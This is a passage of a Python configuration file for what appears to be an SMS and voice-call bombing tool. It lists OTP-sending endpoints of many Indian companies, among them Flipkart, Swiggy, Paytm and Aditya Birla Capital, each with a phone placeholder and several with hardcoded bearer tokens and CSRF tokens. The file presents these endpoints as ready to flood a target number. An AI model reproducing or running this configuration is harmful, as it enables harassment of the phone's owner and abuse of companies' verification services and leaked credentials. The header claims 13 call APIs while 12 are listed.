            "x-kb-new-auth": "false",
            "x-kb-platform": "web"
        },
        "data_template": '{"country_code":"+91","phone":"{phone}","app_signature":"Jc/Zu7qNqQ2"}'
    },
    {
        "name": "JockeyAPI (SMS)",
        "type": "sms",
        "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{phone}?whatsapp=false",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "FasiinAPI",
        "type": "sms",
        "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
        "method": "POST",
        "headers": {
            "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc1NzUyMTM5OSwiZXhwIjoxNzU3NTIxNDU5fQ.XWlps8Al--idsLa1OYcGNcjgeRk5Zdexo2goBZc1BNA",
            "gk-merchant-id": "19kc37zcdyiu"
        },
        "data_template": '{"phone":"{phone}","country":"IN"}'
    },
    {
        "name": "VidyaKul",
        "type": "sms",
        "url": "https://vidyakul.com/signup-otp/send",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "x-csrf-token": "fu4xrNYdXZbb2oT2iuHvjVtMyDw5WNFaeuyPSu7Q",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data_template": "phone={phone}&rcsconsent=true"
    },
    {
        "name": "Aditya Birla Capital",
        "type": "sms",
        "url": "https://oneservice.adityabirlacapital.com/apilogin/onboard/generate-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI4ZGU0N2UwNy1mMDI0LTRlMTUtODMzNC0zOGMwNmFlMzNkNmEiLCJ1bmlxdWVfYXNzaWduZWRfbnVtYmVyIjoiYjViMWVmNGQtZGI0MS00NzExLThjMjAtMGU4NjQyZDBlMDJiIiwiY3JlYXRlZF90aW1lIjoiMDcgT2N0b2JlciwgMjAyNSB8IDA5OjQzOjExIEFNIiwiZXhwaXJlZF90aW1lIjoiMDcgT2N0b2JlciwgMjAyNSB8IDA5OjU4OjExIEFNIiwiaWF0IjoxNzU5ODEwMzkxLCJpc3MiOiI4ZGU0N2UwNy1mMDI0LTRlMTUtODMzNC0zOGMwNmFlMzNkNmEiLCJhdWQiOiJodHRwczovL2hvc3QtdXJsIiwiZXhwIjoxNzU5ODExMjkxfQ.N8a-NMFqmgO0vtY9Bp14EF22Jo3bMEB4n_OlcgwF3RZdIJDg5ZwC_WFc1aI-AU7BdWjpfrEc52ZSsfQ73S8pnY8RePnJrKqmE61vdWRY37VAULvD99eMl2AS7W2lEdE5EZoGGM2WqBuTzW8aO5QIt98deWDSyK9xG0v4tfbYG0469g7mOOpeCAuZC3gTIKZ93k7aHyMcf5FPjSsfIdNxqmdW0IrRx6bOdyr_w3AmYheg4aNNfMi5bc6fu_eKXABuwC9O420CFai9TIkImUEqr8Rxy4Sfe7aFVTN6DB8Fv_J1i7GBgCa3YX0VfZiGpVowXmcTqJQcGSiH4uZVRsmf3g"
        },
        "data_template": '{"request":"CepT08jilRIQiS1EpaNsQVXbRv3PS/eUQ1lAbKfLJuUNvkkemX01P9n5tJiwyfDP3eEXRcol6uGvIAmdehuWBw=="}'
    },
    {
        "name": "Pinknblu",
        "type": "sms",
        "url": "https://pinknblu.com/v1/auth/generate/otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest"
        },
        "data_template": "_token=fbhGqnDcF41IumYCLIyASeXCntgFjC9luBVoSAcb&country_code=+91&phone={phone}"
    },
    {
        "name": "Udaan",
        "type": "sms",
        "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "x-app-id": "udaan-auth"
        },
        "data_template": "mobile={phone}"
    }
])

# ============================================================
# SECTION 4: CALL APIS (13 total)
# ============================================================

CALL_APIS = [
    {
        "name": "GauravCyber Call",
        "type": "call",
        "url": "https://bomm.gauravcyber0.workers.dev/?phone={phone}",
        "method": "GET",
        "headers": {},
        "data_template": None
    },
    {
        "name": "Tata Capital Voice",
        "type": "call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'
    },
    {
        "name": "1MG Voice",
        "type": "call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data_template": '{"number":"{phone}","otp_on_call":true}'
    },
    {
        "name": "Swiggy Voice",
        "type": "call",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "Myntra Voice",
        "type": "call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "Flipkart Voice",
        "type": "call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"mobile":"{phone}"}'
    },
    {
        "name": "Paytm Voice",
        "type": "call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}"}'
    },
    {
        "name": "Zomato Voice",
        "type": "call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data_template": "phone={phone}&type=voice"
    },
    {
        "name": "MakeMyTrip Voice",
        "type": "call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}"}'
    },
    {
        "name": "Goibibo Voice",
        "type": "call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}"}'
    },
    {
        "name": "Ola Voice",
        "type": "call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}"}'
    },
    {
        "name": "Uber Voice",
        "type": "call",
        "url": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data_template": '{"phone":"{phone}"}'
    }
]

# ============================================================
# FINAL COUNTS
# ============================================================
print(f"[CONFIG] ✅ Loaded {len(SMS_WHATSAPP_APIS)} SMS/WhatsApp APIs")
print(f"[CONFIG] ✅ Loaded {len(CALL_APIS)} Call APIs")
print(f"[CONFIG] 🚀 Total APIs ready: {len(SMS_WHATSAPP_APIS) + len(CALL_APIS)}")
